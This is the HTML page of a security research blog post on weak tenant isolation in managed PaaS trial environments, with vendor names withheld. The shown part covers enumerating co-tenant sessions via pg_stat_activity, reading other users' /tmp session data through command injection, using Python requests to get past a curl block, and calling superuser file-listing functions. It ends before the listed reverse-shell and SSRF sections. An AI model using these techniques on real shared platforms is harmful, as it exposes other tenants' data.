@@ -1,0 +1,1342 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Offensive & Defesive Operations covering Web, Cloud, Infra, CTFs and many more..">
+      
+      
+      
+      
+      
+        <link rel="next" href="../../../../2025/03/30/writeup-of-ai-challenges-of-the-cyber-apocalypse-ctf-2025-tales-from-eldoria/">
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.16">
+    
+    
+      
+        <title>Pwning PaaS Cloud Managed Services From Breaking Isolation to Identifying Abuse - Dibyendu SIKDAR</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.7e37652d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Serif:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Serif"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="lime" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#introduction" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../.." title="Dibyendu SIKDAR" class="md-header__button md-logo" aria-label="Dibyendu SIKDAR" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Dibyendu SIKDAR
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Pwning PaaS Cloud Managed Services   From Breaking Isolation to Identifying Abuse
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    
+  
+  
+    <li class="md-tabs__item md-tabs__item--active">
+      <a href="../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../about/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  About
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="https://github.com/dibsy/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  GitHub
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="https://oxhat.blogspot.com/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Old Blog
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../archive/2025/" class="md-tabs__link">
+          
+  
+  
+  Archive
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../category/ai-red-team/" class="md-tabs__link">
+          
+  
+  
+  Categories
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="Dibyendu SIKDAR" class="md-nav__button md-logo" aria-label="Dibyendu SIKDAR" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Dibyendu SIKDAR
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+    
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    About
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="https://github.com/dibsy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    GitHub
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="https://oxhat.blogspot.com/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Old Blog
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Archive
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            Archive
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../archive/2025/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    2025
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../archive/2022/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    2022
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Categories
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            Categories
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/ai-red-team/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    AI Red Team
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/ctf-writeup/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    CTF Writeup
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/command-injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Command Injection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/hackthebox/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Hackthebox
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/hackthebox-cyber-apocalypse-ctf-2025/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Hackthebox Cyber Apocalypse CTF 2025
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/javascript-analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    JavaScript Analysis
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/red-team/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Red Team
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/responsible-disclosure/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Responsible Disclosure
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/supply-chain-security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Supply Chain Security
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/web-application-penetration-testing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Web Application Penetration Testing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Introduction
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#information-disclosure" class="md-nav__link">
+    <span class="md-ellipsis">
+      Information Disclosure
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lack-of-user-data-isolation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lack of User Data Isolation
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#command-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Command Execution
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Command Execution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bypassing-restricted-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bypassing Restricted Commands
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remote-command-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remote Command Execution
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reverse Shell
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploiting-pgadmin4-console" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploiting PGAdmin4 Console
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      SSRF
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SSRF">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#aws" class="md-nav__link">
+    <span class="md-ellipsis">
+      AWS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#azure" class="md-nav__link">
+    <span class="md-ellipsis">
+      Azure
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusions" class="md-nav__link">
+    <span class="md-ellipsis">
+      Conclusions
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+  <div class="md-content md-content--post" data-md-component="content">
+    <div class="md-sidebar md-sidebar--post" data-md-component="sidebar" data-md-type="navigation">
+      <div class="md-sidebar__scrollwrap">
+        <div class="md-sidebar__inner md-post">
+          <nav class="md-nav md-nav--primary">
+            <div class="md-post__back">
+              <div class="md-nav__title md-nav__container">
+                <a href="../../../.." class="md-nav__link">
+                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+                  <span class="md-ellipsis">
+                    Back to index
+                  </span>
+                </a>
+              </div>
+            </div>
+            
+              <div class="md-post__authors md-typeset">
+                
+                  <div class="md-profile md-post__profile">
+                    <span class="md-author md-author--long">
+                      <img src="https://github.com/dibsy.png" alt="Dibyendu SIKDAR">
+                    </span>
+                    <span class="md-profile__description">
+                      <strong>
+                        
+                          Dibyendu SIKDAR
+                        
+                      </strong>
+                      <br>
+                      Author
+                    </span>
+                  </div>
+                
+              </div>
+            
+            <ul class="md-post__meta md-nav__list">
+              <li class="md-nav__item md-nav__item--section">
+                <div class="md-post__title">
+                  <span class="md-ellipsis">
+                    Metadata
+                  </span>
+                </div>
+                <nav class="md-nav">
+                  <ul class="md-nav__list">
+                    <li class="md-nav__item">
+                      <div class="md-nav__link">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"/></svg>
+                        <time datetime="2022-08-18 00:00:00+00:00" class="md-ellipsis">August 18, 2022</time>
+                      </div>
+                    </li>
+                    
+                    
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 3v15h3V3zm3 2 4 13 3-1-4-13zM5 5v13h3V5zM3 19v2h18v-2z"/></svg>
+                          <span class="md-ellipsis">
+                            in
+                            
+                              <a href="../../../../category/supply-chain-security/">Supply Chain Security</a>, 
+                              <a href="../../../../category/responsible-disclosure/">Responsible Disclosure</a></span>
+                        </div>
+                      </li>
+                    
+                    
+                      
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"/></svg>
+                          <span class="md-ellipsis">
+                            
+                              10 min read
+                            
+                          </span>
+                        </div>
+                      </li>
+                    
+                  </ul>
+                </nav>
+              </li>
+            </ul>
+            
+          </nav>
+          
+        </div>
+      </div>
+    </div>
+    <article class="md-content__inner md-typeset">
+      
+        
+  
+
+
+
+
+  <h1>Pwning PaaS Cloud Managed Services   From Breaking Isolation to Identifying Abuse</h1>
+
+<h2 id="introduction">Introduction</h2>
+<p>This research is heavily inspired by the insightful work published by the team at Wiz (https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities). Motivated by their findings, I conducted an independent assessment focused on Platform-as-a-Service (PaaS) environments—specifically targeting platforms that offer managed services in two primary categories:</p>
+<ul>
+<li>Coding Platforms</li>
+<li>Managed Service Platforms</li>
+</ul>
+<!-- more -->
+<p>Each provider implements its own approach to tenant isolation and access control. Some rely on logical isolation mechanisms such as fine-grained roles and permissions, while others enforce separation through dedicated virtual machines or container-level boundaries. While these design decisions often stem from considerations like cost, scalability, and architectural complexity, they also introduce varying degrees of exposure—particularly when trial or unauthenticated access is allowed.</p>
+<p>Malicious actors can easily register for trial accounts and exploit these platforms for abuse or profit elevating the compute usage. This research highlights several such abuse scenarios, demonstrating how insufficient or misconfigured isolation can lead to unintended access across tenant boundaries.</p>
+<p>Some of the issues identified are intrinsic to the platform’s design and known to the respective vendors. To avoid irresponsible disclosure or enabling abuse, specific vendor names and platform details are intentionally omitted.</p>
+<div class="admonition danger">
+<p class="admonition-title">Note</p>
+<p>All testing was performed strictly within trial environments—typically provisioned without any payment information. In certain cases, the services required no registration at all, allowing for immediate access to managed compute or runtime environments.</p>
+</div>
+<h2 id="information-disclosure">Information Disclosure</h2>
+<p>I registered for a trial account with a cloud provider offering a shared PostgreSQL database service, where multiple tenants operate within the same PostgreSQL cluster instance.</p>
+<p>Upon connecting to the database, I queried the currently authenticated user using the standard SQL command:</p>
+<div class="admonition example">
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">user</span><span class="p">;</span>
+</span></code></pre></div>
+<blockquote>
+<p>fywomXYZ</p>
+</blockquote>
+</div>
+<p>This value corresponded both to my database username and to the default database schema allocated for my account—an indicator of how user-specific isolation was implemented.</p>
+<p>In shared PostgreSQL environments, one of the common metadata sources is the <code>pg_stat_activity</code> view, which exposes information about all active sessions on the cluster. By running the following query:</p>
+<div class="admonition example">
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">pg_stat_activity</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">5</span><span class="p">;</span>
+</span></code></pre></div>
+</div>
+<p>I was able to retrieve a snapshot of other active database sessions, including usernames, database names and query activities. This confirmed that multiple user accounts were co-located within the same PostgreSQL backend, lacking strong tenant isolation.</p>
+<div class="admonition danger">
+<p><img alt="" src="../../../../images/paas-isolation/usernames-hidden.png" /></p>
+</div>
+<p>Such exposure allows an attacker to enumerate other tenant usernames and analyze active session metadata. From here, one could potentially perform online brute-force attacks using dictionary-based password attempts, especially if login rate limiting or anomaly detection is not enforced at the PostgreSQL layer or via a reverse proxy. Furthermore, metadata leakage through pg_stat_activity can also aid in identifying long-running queries, idle sessions, or behavioral patterns—useful for staging more targeted attacks or lateral exploration.</p>
+<p>This finding highlights a confidentiality gap in multi-tenant managed database services: insufficient logical isolation at the PostgreSQL engine level, especially when default visibility settings are not restricted per tenant.</p>
+<h2 id="lack-of-user-data-isolation">Lack of User Data Isolation</h2>
+<p>In some shared service environments, user-specific data—such as session information, temporary credentials, or runtime artifacts—is improperly stored in globally accessible directories like /tmp. While more security-conscious systems implement strict restricted directory listing, many shared environments overlook these configurations.</p>
+<p>By leveraging command injection vulnerabilities within the application layer, it becomes possible to enumerate filesystem contents—particularly within writable or commonly used directories like <code>/tmp</code>. During one such enumeration, I identified a <code>sessions/</code> subdirectory that appeared to store users data inside unique sub directories having names equivalent to their session id values. For example, if I have a session <code>a0b1c2d4</code> then a directory will be created as <code>/tmp/sessions/a0b1c2d4</code></p>
+<div class="admonition danger">
+<p><img alt="" src="../../../../images/paas-isolation/sessions.png" /></p>
+</div>
+<p>Analyzing these session directories provided valuable insights, including:</p>
+<ul>
+<li>Active usernames or user IDs</li>
+<li>Shell history or executed commands (in some cases)</li>
+<li>User created data</li>
+</ul>
+<p>In one specific instance, I discovered that another tenant on the platform was attempting a local privilege escalation. While I dont know the real intension, their session data included LinPEAS, a popular post-exploitation enumeration script, commonly used to identify privilege escalation vectors on Linux systems:</p>
+<div class="admonition danger">
+<p><img alt="" src="../../../../images/paas-isolation/another-user-data.png" /></p>
+</div>
+<p>This kind of visibility into co-tenant activities represents a serious breach of isolation and confidentiality. It exposes not only behavioral patterns but also potentially sensitive operational data, turning shared environments into a passive reconnaissance surface for malicious users.</p>
+<h2 id="command-execution">Command Execution</h2>
+<h3 id="bypassing-restricted-commands">Bypassing Restricted Commands</h3>
+<p>In certain environments, basic hardening measures were implemented to restrict direct shell access. Specifically, execution of system-level commands (e.g., via exec, os.system, or backticks) was restricted to privileged users or sandboxed entirely. However, these restrictions often focused on blocking shell-level invocation rather than addressing broader code execution pathways.</p>
+<p>To circumvent these controls, I leveraged the built-in Python libraries, which are often available in linux environments. Instead of invoking a shell with:</p>
+<div class="admonition failure">
+<p class="admonition-title">Failure</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;curl http://127.0.0.1:5000&#39;</span><span class="p">)</span>
+</span></code></pre></div>
+<blockquote>
+<p>sh: 1: curl: Permission denied</p>
+</blockquote>
+</div>
+<p>—which would typically result in a permission denied error or be blocked outright—I transitioned to using Python's native requests module to achieve the same effect programmatically:</p>
+<div class="admonition success">
+<p class="admonition-title">Success</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;http://127.0.0.1:5000&quot;</span><span class="p">)</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></code></pre></div>
+</div>
+<p>This bypass technique avoids spawning a shell entirely, making it more compatible with sandboxed environments that only restrict shell execution but still permit outbound HTTP requests through high-level libraries. We can also use this technique to read and write files. </p>
+<h3 id="remote-command-execution">Remote Command Execution</h3>
+<p>In one particular case, the target application provided a trial account to new users without requiring any payment or credit card verification during registration. Upon successful account creation, the UI indicated that the provisioned user was granted super admin privileges.</p>
+<p>While exploring the web interface, a section labeled "SSH Access" was available. However, clicking on this tab returned a message stating that SSH access was not permitted for the current account, suggesting that remote shell access was disabled at the UI level.</p>
+<div class="admonition info">
+<p><img alt="" src="../../../../images/paas-isolation/ssh-not-available.png" /></p>
+</div>
+<p>Despite the lack of SSH access, I was able to get to execute system commands and get reverse shell on the machine. The platform provided a set of credentials for a PostgreSQL database instance, accessible directly from the user's local machine using the psql client. The connection was established via a URI in the following format:</p>
+<div class="admonition example">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>psql<span class="w"> </span><span class="s2">&quot;postgres://&lt;user&gt;:&lt;password&gt;@&lt;host&gt;:&lt;port&gt;/&lt;dbname&gt;&quot;</span>
+</span></code></pre></div>
+</div>
+<p>Once connected, I confirmed the version and underlying OS using:</p>
+<div class="admonition example">
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">postgres</span><span class="o">=#</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">();</span>
+</span></code></pre></div>
+<blockquote>
+<p>PostgreSQL 14.4 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-44), 64-bit</p>
+</blockquote>
+</div>
+<p>As users are provided with super admin privileges, I proceeded to test functions typically restricted to high-privileged roles (e.g., users with the pg_read_server_files role). One such function is pg_ls_dir, which allows directory listing on the server:</p>
+<div class="admonition example">
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">postgres</span><span class="o">=#</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="n">pg_ls_dir</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
+</span></code></pre></div>
